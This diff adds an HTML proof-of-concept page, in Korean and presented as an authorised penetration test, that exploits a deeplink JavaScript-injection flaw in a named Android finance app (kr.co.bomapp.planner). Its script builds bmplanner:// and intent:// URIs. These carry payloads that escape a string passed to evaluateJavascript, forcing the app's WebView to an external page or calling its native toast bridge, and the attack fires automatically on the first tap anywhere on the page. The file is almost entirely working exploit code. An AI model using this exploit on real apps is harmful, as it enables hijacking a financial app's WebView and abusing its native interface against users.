@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>모의해킹 테스트 - DeepLink Injection</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#f2f2f2; margin:0; padding:20px; }
+    h1 { color:#333; font-size:20px; }
+    .desc { color:#666; font-size:13px; margin-bottom:16px; }
+    button { display:block; width:100%; box-sizing:border-box; margin:8px 0; padding:14px;
+             font-size:15px; border:none; border-radius:8px; color:#fff; background:#c0392b; }
+    button.alt { background:#2c3e50; }
+    button.safe { background:#27ae60; }
+    #log { margin-top:16px; padding:12px; background:#111; color:#0f0; font-size:11px;
+           border-radius:8px; white-space:pre-wrap; word-break:break-all; min-height:70px; }
+    .hint { color:#999; font-size:11px; margin-top:8px; }
+    .cfg { color:#999; font-size:11px; }
+  </style>
+</head>
+<body>
+  <!-- 승인된 모의해킹(전자금융 모바일) 진단용 PoC. bmplanner DeepLink -> DeeplinkTool -> onReceiveDeeplink() 의
+       evaluateJavascript 문자열 인젝션 검증. 무단 사용 금지. -->
+  <h1>모의해킹 테스트용 페이지 (DeepLink Injection)</h1>
+  <div class="desc">빈 화면을 한 번 탭하면 <b>기본 공격(①)</b>이 자동 실행됩니다. 아래 버튼으로 변형별 테스트도 가능합니다.</div>
+
+  <button onclick="ev(event,'direct','page')">① 직접 스킴 · 내 페이지 로드</button>
+  <button class="alt" onclick="ev(event,'intent','page')">② intent 래퍼 · 내 페이지 로드</button>
+  <button class="safe" onclick="ev(event,'direct','toast')">③ 직접 스킴 · toast 증명(비이동)</button>
+  <button class="safe alt" onclick="ev(event,'intent','toast')">④ intent 래퍼 · toast 증명(비이동)</button>
+
+  <div id="log">[log] 대기 중…</div>
+  <div class="hint">
+    성공 판정: ①·② → 내 페이지(test1.html)로 이동 / ③·④ → 도메인 담긴 toast 표시.<br>
+    Chrome이 따옴표를 인코딩해 직접 스킴이 안 먹히면 intent 래퍼(②·④)를 시도하세요.
+  </div>
+  <div class="cfg" id="cfg"></div>
+
+  <script>
+    // ===== 설정 =====
+    var TARGET = "https://fpdh0104.github.io/testhub/test1.html"; // 이동시킬 내 페이지
+    var PKG    = "kr.co.bomapp.planner";     // 운영 설치본. 스테이징이면 kr.co.bomapp.planner.stg
+    // ================
+
+    document.getElementById('cfg').textContent = "target=" + TARGET + " / package=" + PKG;
+
+    function log(m){
+      var el = document.getElementById('log');
+      el.textContent = "[log] " + m + "\n" + el.textContent;
+    }
+
+    // onReceiveDeeplink('<여기>') 의 JS 문자열을 탈출시키는 페이로드 (앞뒤 따옴표 균형 유지)
+    function payload(kind){
+      if (kind === 'toast'){
+        return "'+androidNative.toast(document.domain,'short')+'";
+      }
+      // 기본: 내 페이지 강제 로드
+      return "'+window.location.assign('" + TARGET + "')+'";
+    }
+
+    function buildUri(mode, kind){
+      var p = payload(kind);
+      if (mode === 'intent'){
+        return "intent://app?x=" + p + "#Intent;scheme=bmplanner;package=" + PKG + ";end";
+      }
+      // direct custom scheme
+      return "bmplanner://app?x=" + p;
+    }
+
+    function fire(mode, kind){
+      var uri = buildUri(mode, kind);
+      log("발사(" + mode + "/" + kind + "): " + uri);
+      // 살짝 지연 — 로그가 보이도록
+      setTimeout(function(){ window.location.href = uri; }, 120);
+    }
+
+    // 버튼용: 배경 자동발사와 겹치지 않게 전파 차단
+    function ev(e, mode, kind){
+      if (e && e.stopPropagation) e.stopPropagation();
+      fire(mode, kind);
+    }
+
+    // 빈 화면 첫 탭/클릭 -> 기본 공격 자동 실행
+    function auto(){ fire('direct','page'); }
+    document.addEventListener('click', auto, { once:true });
+    document.addEventListener('touchstart', auto, { once:true });
+  </script>
+</body>
+</html>
